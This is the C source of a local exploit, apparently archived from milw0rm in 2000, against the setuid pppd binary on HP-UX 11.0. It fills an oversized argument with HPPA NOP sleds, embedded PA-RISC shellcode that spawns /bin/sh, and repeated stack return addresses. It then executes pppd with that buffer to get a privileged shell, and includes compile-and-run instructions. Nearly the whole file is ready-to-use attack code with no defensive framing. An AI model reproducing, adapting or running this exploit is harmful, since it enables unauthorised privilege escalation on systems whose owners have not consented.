/*      Copyright (c) 2000 ADM                                  */
/*      All Rights Reserved                                     */
/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */
/*                                                              */
/*      Title:        HP-UX pppd                                */
/*      Tested under: HP-UX 11.0                                */
/*      By:           K2                                        */
/*      Use:          gcc -o pppd hp-pppd.c ; ./pppd            */
/*                    (more hp to come :)                       */
/*                                                              */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH 22000
#define STACK_OFFSET 8042
#define EXTRA 3000
#define HPPA_NOP 0x3902800b /* weirdo nop */

u_char hppa_shellcode[] =
"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff\xff";

u_long get_sp(void)
{
   __asm__("copy %sp,%ret0 \n");
}

int main(int argc, char *argv[])
{
   char buf[BUF_LENGTH + 8];
   unsigned long targ_addr;
   u_long *long_p;
   u_char *char_p;
   int i, code_length = strlen(hppa_shellcode),dso=STACK_OFFSET,xtra=EXTRA;

   if(argc > 1) dso+=atoi(argv[1]);
   if(argc > 2) xtra+=atoi(argv[2]);

   long_p = (u_long *) buf;

   for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)
     *long_p++ = HPPA_NOP;

   char_p = (u_char *) long_p;

   char_p--;  /* weirdness alighnment issue */

   for (i = 0; i < code_length; i++)
     *char_p++ = hppa_shellcode[i];

   targ_addr = get_sp() - dso;

   for (i = 0; i < xtra /4; i++)
   {
      *char_p++ =(targ_addr>>24)&255;
      *char_p++ =(targ_addr>>16)&255;
      *char_p++ =(targ_addr>>8)&255;
      *char_p++ =(targ_addr)&255;
   }
  
   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",targ_addr,strlen(buf),xtra,dso);

   execl("/usr/bin/pppd","pppd", buf,(char *) 0);
   perror("execl failed");
   return(-1);
}


// milw0rm.com [2000-11-20]
